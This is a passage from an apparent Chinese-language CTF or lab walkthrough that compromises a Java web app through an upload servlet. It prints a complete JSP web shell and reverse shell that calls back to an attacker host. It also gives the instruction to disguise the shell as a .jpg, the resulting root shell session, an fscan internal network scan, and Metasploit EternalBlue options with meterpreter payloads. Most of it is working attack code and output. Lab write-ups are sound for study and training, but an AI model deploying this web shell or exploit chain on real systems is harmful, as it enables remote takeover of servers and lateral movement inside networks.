<span class="hljs-variable">&lt;servlet-name&gt;</span>HelloServlet<span class="hljs-variable">&lt;/servlet-name&gt;</span><br>    <span class="hljs-variable">&lt;servlet-class&gt;</span>com.example.HelloServlet<span class="hljs-variable">&lt;/servlet-class&gt;</span><br>  <span class="hljs-variable">&lt;/servlet&gt;</span><br>  <span class="hljs-variable">&lt;servlet-mapping&gt;</span><br>    <span class="hljs-variable">&lt;servlet-name&gt;</span>HelloServlet<span class="hljs-variable">&lt;/servlet-name&gt;</span><br>    <span class="hljs-variable">&lt;url-pattern&gt;</span>/HelloServlet<span class="hljs-variable">&lt;/url-pattern&gt;</span><br>  <span class="hljs-variable">&lt;/servlet-mapping&gt;</span><br><br>  <span class="hljs-variable">&lt;servlet&gt;</span><br>    <span class="hljs-variable">&lt;display-name&gt;</span>LoginServlet<span class="hljs-variable">&lt;/display-name&gt;</span><br>    <span class="hljs-variable">&lt;servlet-name&gt;</span>LoginServlet<span class="hljs-variable">&lt;/servlet-name&gt;</span><br>    <span class="hljs-variable">&lt;servlet-class&gt;</span>com.example.LoginServlet<span class="hljs-variable">&lt;/servlet-class&gt;</span><br>  <span class="hljs-variable">&lt;/servlet&gt;</span><br>  <span class="hljs-variable">&lt;servlet-mapping&gt;</span><br>    <span class="hljs-variable">&lt;servlet-name&gt;</span>LoginServlet<span class="hljs-variable">&lt;/servlet-name&gt;</span><br>    <span class="hljs-variable">&lt;url-pattern&gt;</span>/LoginServlet<span class="hljs-variable">&lt;/url-pattern&gt;</span><br>  <span class="hljs-variable">&lt;/servlet-mapping&gt;</span><br><br>  <span class="hljs-variable">&lt;servlet&gt;</span><br>    <span class="hljs-variable">&lt;display-name&gt;</span>RegisterServlet<span class="hljs-variable">&lt;/display-name&gt;</span><br>    <span class="hljs-variable">&lt;servlet-name&gt;</span>RegisterServlet<span class="hljs-variable">&lt;/servlet-name&gt;</span><br>    <span class="hljs-variable">&lt;servlet-class&gt;</span>com.example.RegisterServlet<span class="hljs-variable">&lt;/servlet-class&gt;</span><br>  <span class="hljs-variable">&lt;/servlet&gt;</span><br>  <span class="hljs-variable">&lt;servlet-mapping&gt;</span><br>    <span class="hljs-variable">&lt;servlet-name&gt;</span>RegisterServlet<span class="hljs-variable">&lt;/servlet-name&gt;</span><br>    <span class="hljs-variable">&lt;url-pattern&gt;</span>/RegisterServlet<span class="hljs-variable">&lt;/url-pattern&gt;</span><br>  <span class="hljs-variable">&lt;/servlet-mapping&gt;</span><br><br>  <span class="hljs-variable">&lt;servlet&gt;</span><br>    <span class="hljs-variable">&lt;display-name&gt;</span>UploadTestServlet<span class="hljs-variable">&lt;/display-name&gt;</span><br>    <span class="hljs-variable">&lt;servlet-name&gt;</span>UploadTestServlet<span class="hljs-variable">&lt;/servlet-name&gt;</span><br>    <span class="hljs-variable">&lt;servlet-class&gt;</span>com.example.UploadTestServlet<span class="hljs-variable">&lt;/servlet-class&gt;</span><br>  <span class="hljs-variable">&lt;/servlet&gt;</span><br>  <span class="hljs-variable">&lt;servlet-mapping&gt;</span><br>    <span class="hljs-variable">&lt;servlet-name&gt;</span>UploadTestServlet<span class="hljs-variable">&lt;/servlet-name&gt;</span><br>    <span class="hljs-variable">&lt;url-pattern&gt;</span>/UploadServlet<span class="hljs-variable">&lt;/url-pattern&gt;</span><br>  <span class="hljs-variable">&lt;/servlet-mapping&gt;</span><br><br>  <span class="hljs-variable">&lt;servlet&gt;</span><br>    <span class="hljs-variable">&lt;display-name&gt;</span>DownloadFileServlet<span class="hljs-variable">&lt;/display-name&gt;</span><br>    <span class="hljs-variable">&lt;servlet-name&gt;</span>DownloadFileServlet<span class="hljs-variable">&lt;/servlet-name&gt;</span><br>    <span class="hljs-variable">&lt;servlet-class&gt;</span>com.example.DownloadFileServlet<span class="hljs-variable">&lt;/servlet-class&gt;</span><br>  <span class="hljs-variable">&lt;/servlet&gt;</span><br>  <span class="hljs-variable">&lt;servlet-mapping&gt;</span><br>    <span class="hljs-variable">&lt;servlet-name&gt;</span>DownloadFileServlet<span class="hljs-variable">&lt;/servlet-name&gt;</span><br>    <span class="hljs-variable">&lt;url-pattern&gt;</span>/DownloadServlet<span class="hljs-variable">&lt;/url-pattern&gt;</span><br>  <span class="hljs-variable">&lt;/servlet-mapping&gt;</span><br><span class="hljs-variable">&lt;/web-app&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>有&#x2F;UploadServlet, <a target="_blank" rel="noopener" href="https://www.revshells.com/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%ACjsp%E6%94%B9jpg%E4%BC%A0%E4%B8%8A%E5%8E%BB">https://www.revshells.com/生成木马jsp改jpg传上去</a></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs gradle">&lt;%<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.</span><br><span class="hljs-comment">     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.</span><br><span class="hljs-comment">     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button &quot;send&quot; is clicked, it will try to connect to the reverse shell again (apart from executing </span><br><span class="hljs-comment">     * the command specified in the HTML form). This is to avoid to keep it simple.</span><br><span class="hljs-comment">     */</span><br>%&gt;<br><br>&lt;%@page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.*&quot;</span>%&gt;<br>&lt;%@page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>&lt;%@page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.net.*&quot;</span>%&gt;<br>&lt;%@page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*&quot;</span>%&gt;<br><br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;jrshell&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form METHOD=<span class="hljs-string">&quot;POST&quot;</span> NAME=<span class="hljs-string">&quot;myform&quot;</span> ACTION=<span class="hljs-string">&quot;&quot;</span>&gt;<br>    &lt;input TYPE=<span class="hljs-string">&quot;text&quot;</span> NAME=<span class="hljs-string">&quot;shell&quot;</span>&gt;<br>    &lt;input TYPE=<span class="hljs-string">&quot;submit&quot;</span> VALUE=<span class="hljs-string">&quot;Send&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;pre&gt;<br>&lt;%<br>    <span class="hljs-comment">// Define the OS</span><br>    String shellPath = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="hljs-string">&quot;windows&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>            shellPath = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            shellPath = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;cmd.exe&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span>( Exception e )&#123;&#125;<br>    <span class="hljs-comment">// INNER HTML PART</span><br>    <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;shell&quot;</span>) != <span class="hljs-keyword">null</span>) &#123;<br>        out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;Command: &quot;</span> + request.getParameter(<span class="hljs-string">&quot;shell&quot;</span>) + <span class="hljs-string">&quot;\n&lt;BR&gt;&quot;</span>);<br>        Process p;<br>        <span class="hljs-keyword">if</span> (shellPath.equals(<span class="hljs-string">&quot;cmd.exe&quot;</span>))<br>            p = <span class="hljs-keyword">Runtime</span>.getRuntime().exec(<span class="hljs-string">&quot;cmd.exe /c &quot;</span> + request.getParameter(<span class="hljs-string">&quot;shell&quot;</span>));<br>        <span class="hljs-keyword">else</span><br>            p = <span class="hljs-keyword">Runtime</span>.getRuntime().exec(<span class="hljs-string">&quot;/bin/sh -c &quot;</span> + request.getParameter(<span class="hljs-string">&quot;shell&quot;</span>));<br>        OutputStream os = p.getOutputStream();<br>        InputStream in = p.getInputStream();<br>        DataInputStream dis = <span class="hljs-keyword">new</span> DataInputStream(in);<br>        String disr = dis.readLine();<br>        <span class="hljs-keyword">while</span> ( disr != <span class="hljs-keyword">null</span> ) &#123;<br>            out.<span class="hljs-keyword">println</span>(disr);<br>            disr = dis.readLine();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// TCP PORT PART</span><br>    <span class="hljs-keyword">class</span> StreamConnector <span class="hljs-keyword">extends</span> Thread<br>    &#123;<br>        InputStream wz;<br>        OutputStream yr;<br>        StreamConnector( InputStream wz, OutputStream yr ) &#123;<br>            <span class="hljs-keyword">this</span>.wz = wz;<br>            <span class="hljs-keyword">this</span>.yr = yr;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> run()<br>        &#123;<br>            BufferedReader r  = <span class="hljs-keyword">null</span>;<br>            BufferedWriter w = <span class="hljs-keyword">null</span>;<br>            <span class="hljs-keyword">try</span><br>            &#123;<br>                r  = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(wz));<br>                w = <span class="hljs-keyword">new</span> BufferedWriter(<span class="hljs-keyword">new</span> OutputStreamWriter(yr));<br>                <span class="hljs-keyword">char</span> buffer[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">8192</span>];<br>                <span class="hljs-keyword">int</span> length;<br>                <span class="hljs-keyword">while</span>( ( length = r.<span class="hljs-keyword">read</span>( buffer, <span class="hljs-number">0</span>, buffer.length ) ) &gt; <span class="hljs-number">0</span> )<br>                &#123;<br>                    w.<span class="hljs-keyword">write</span>( buffer, <span class="hljs-number">0</span>, length );<br>                    w.flush();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span>( Exception e )&#123;&#125;<br>            <span class="hljs-keyword">try</span><br>            &#123;<br>                <span class="hljs-keyword">if</span>( r != <span class="hljs-keyword">null</span> )<br>                    r.close();<br>                <span class="hljs-keyword">if</span>( w != <span class="hljs-keyword">null</span> )<br>                    w.close();<br>            &#125; <span class="hljs-keyword">catch</span>( Exception e )&#123;&#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">try</span> &#123;<br>        Socket socket = <span class="hljs-keyword">new</span> Socket( <span class="hljs-string">&quot;VPS&quot;</span>, <span class="hljs-number">9000</span> ); <span class="hljs-comment">// Replace with wanted ip and port</span><br>        Process process = <span class="hljs-keyword">Runtime</span>.getRuntime().exec( shellPath );<br>        <span class="hljs-keyword">new</span> StreamConnector(process.getInputStream(), socket.getOutputStream()).start();<br>        <span class="hljs-keyword">new</span> StreamConnector(socket.getInputStream(), process.getOutputStream()).start();<br>        out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;port opened on &quot;</span> + socket);<br>     &#125; <span class="hljs-keyword">catch</span>( Exception e ) &#123;&#125;<br>%&gt;<br>&lt;/pre&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs maxima">connect to [<span class="hljs-number">172.31</span><span class="hljs-number">.15</span><span class="hljs-number">.71</span>] from (UNKNOWN) [<span class="hljs-number">39.98</span><span class="hljs-number">.112</span><span class="hljs-number">.38</span>] <span class="hljs-number">43068</span><br>whoami<br>root<br>ls /root<br>flag<br>cat /root/flag/f*<br>  ████████                             ████ ██<br> ██░░░░░░  ██████                     ░██░ ░░            █████<br>░██       ░██░░░██  ██████   ██████  ██████ ██ ███████  ██░░░██<br>░█████████░██  ░██ ██░░░░██ ██░░░░██░░░██░ ░██░░██░░░██░██  ░██<br>░░░░░░░░██░██████ ░██   ░██░██   ░██  ░██  ░██ ░██  ░██░░██████<br>       ░██░██░░░  ░██   ░██░██   ░██  ░██  ░██ ░██  ░██ ░░░░░██<br> ████████ ░██     ░░██████ ░░██████   ░██  ░██ ███  ░██  █████<br>░░░░░░░░  ░░       ░░░░░░   ░░░░░░    ░░   ░░ ░░░   ░░  ░░░░░<br><br>This <span class="hljs-built_in">is</span> the <span class="hljs-built_in">first</span> flag you <span class="hljs-built_in">get</span>.<br><br>flag01: flag&#123;8da46caa-<span class="hljs-number">45b3</span>-461a-<span class="hljs-number">86b8</span>-8ee6c9cd7c42&#125;<br></code></pre></td></tr></table></figure>
+
+<p>传fscan扫内网搭代理</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">ip addr<br><span class="hljs-number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="hljs-number">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="hljs-number">1000</span><br>    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    inet <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/<span class="hljs-number">8</span> scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host<br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">2</span>: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="hljs-number">1500</span> qdisc mq state UP group default qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:3e:<span class="hljs-number">22</span>:<span class="hljs-number">51</span>:<span class="hljs-number">40</span> brd ff:ff:ff:ff:ff:ff<br>    inet <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">76</span>/<span class="hljs-number">16</span> brd <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span> scope global dynamic eth0<br>       valid_lft 1892158259sec preferred_lft 1892158259sec<br>    inet6 fe80::<span class="hljs-number">216</span>:3eff:fe22:<span class="hljs-number">5140</span>/<span class="hljs-number">64</span> scope link<br>       valid_lft forever preferred_lft forever<br>./fscan -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">76</span>/<span class="hljs-number">24</span><br>start infoscan<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">6</span>     is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">76</span>    is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">45</span>    is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">26</span>    is alive<br><span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">4</span><br><span class="hljs-number">172.22.11.26:445</span> open<br><span class="hljs-number">172.22.11.6:445</span> open<br><span class="hljs-number">172.22.11.26:135</span> open<br><span class="hljs-number">172.22.11.6:139</span> open<br><span class="hljs-number">172.22.11.45:135</span> open<br><span class="hljs-number">172.22.11.6:135</span> open<br><span class="hljs-number">172.22.11.26:139</span> open<br><span class="hljs-number">172.22.11.45:139</span> open<br><span class="hljs-number">172.22.11.76:22</span> open<br><span class="hljs-number">172.22.11.76:8080</span> open<br><span class="hljs-number">172.22.11.6:88</span> open<br><span class="hljs-number">172.22.11.45:445</span> open<br><span class="hljs-number">172.22.11.76:8009</span> open<br><span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">13</span><br>start vulscan<br><span class="hljs-string">[*]</span> NetInfo<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">26</span><br>   <span class="hljs-string">[-&gt;]</span>XR-LCM3AE8B<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">26</span><br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">6</span>     <span class="hljs-string">[+]</span> DC:XIAORANG\XIAORANG-DC<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">45</span>    XR-DESKTOP.xiaorang.lab             Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span><br><span class="hljs-string">[*]</span> NetInfo<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">6</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-DC<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">6</span><br><span class="hljs-string">[+]</span> MS17-<span class="hljs-number">010</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">45</span>       (Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span>)<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">26</span>    XIAORANG\XR-LCM3AE8B<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">11</span>.<span class="hljs-number">76</span>:<span class="hljs-number">8080</span>  code:<span class="hljs-number">200</span> len:<span class="hljs-number">7091</span>   title:后台管理<br>已完成 <span class="hljs-number">13</span>/<span class="hljs-number">13</span><br><span class="hljs-string">[*]</span> 扫描结束,耗时: <span class="hljs-number">8</span>.236386924s<br><br><span class="hljs-number">172.22.11.76</span><br><span class="hljs-number">172.22.11.45</span>（MS17-<span class="hljs-number">010</span>）<br><span class="hljs-number">172.22.11.26</span>（XR-LCM3AE8B）<br><span class="hljs-number">172.22.11.6</span>（DC）<br></code></pre></td></tr></table></figure>
+
+<h2 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs clean">msf exploit(windows/smb/ms17_010_eternalblue) &gt; options<br><br>Module options (exploit/windows/smb/ms17_010_eternalblue):<br><br>   Name           Current Setting  Required  Description<br>   ----           ---------------  --------  -----------<br>   RHOSTS                          yes       The target host(s), see https:<span class="hljs-comment">//docs.metasploit.com/docs/using-metasploi</span><br>                                             t/basics/using-metasploit.html<br>   RPORT          <span class="hljs-number">445</span>              yes       The target port (TCP)<br>   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Wi<br>                                             ndows Server <span class="hljs-number">2008</span> R2, Windows <span class="hljs-number">7</span>, Windows Embedded Standard <span class="hljs-number">7</span> target mach<br>                                             ines.<br>   SMBPass                         no        (Optional) The password for the specified username<br>   SMBUser                         no        (Optional) The username to authenticate <span class="hljs-keyword">as</span><br>   VERIFY_ARCH    true             yes       Check <span class="hljs-keyword">if</span> remote architecture matches exploit Target. Only affects Window<br>                                             s Server <span class="hljs-number">2008</span> R2, Windows <span class="hljs-number">7</span>, Windows Embedded Standard <span class="hljs-number">7</span> target machines<br>                                             .<br>   VERIFY_TARGET  true             yes       Check <span class="hljs-keyword">if</span> remote OS matches exploit Target. Only affects Windows Server <span class="hljs-number">2</span><br>                                             <span class="hljs-number">008</span> R2, Windows <span class="hljs-number">7</span>, Windows Embedded Standard <span class="hljs-number">7</span> target machines.<br><br><br>Payload options (windows/x64/meterpreter/reverse_tcp):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="hljs-string">&#x27;&#x27;</span>, seh, thread, process, none)<br>   LHOST     <span class="hljs-number">198.18</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>       yes       The listen address (an interface may be specified)<br>   LPORT     <span class="hljs-number">4444</span>             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   <span class="hljs-number">0</span>   Automatic Target<br><br><br><br>View the full <span class="hljs-keyword">module</span> info <span class="hljs-keyword">with</span> the info, or info -d command.<br><br>msf exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/bind_tcp<br>payload =&gt; windows/x64/meterpreter/bind_tcp<br>msf exploit(windows/smb/ms17_010_eternalblue) &gt; options<br><br>Module options (exploit/windows/smb/ms17_010_eternalblue):<br><br>   Name           Current Setting  Required  Description<br>   ----           ---------------  --------  -----------<br>   RHOSTS                          yes       The target host(s), see https:<span class="hljs-comment">//docs.metasploit.com/docs/using-metasploi</span><br>                                             t/basics/using-metasploit.html<br>   RPORT          <span class="hljs-number">445</span>              yes       The target port (TCP)<br>   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Wi<br>                                             ndows Server <span class="hljs-number">2008</span> R2, Windows <span class="hljs-number">7</span>, Windows Embedded Standard <span class="hljs-number">7</span> target mach<br>                                             ines.<br>   SMBPass                         no        (Optional) The password for the specified username<br>   SMBUser                         no        (Optional) The username to authenticate <span class="hljs-keyword">as</span><br>   VERIFY_ARCH    true             yes       Check <span class="hljs-keyword">if</span> remote architecture 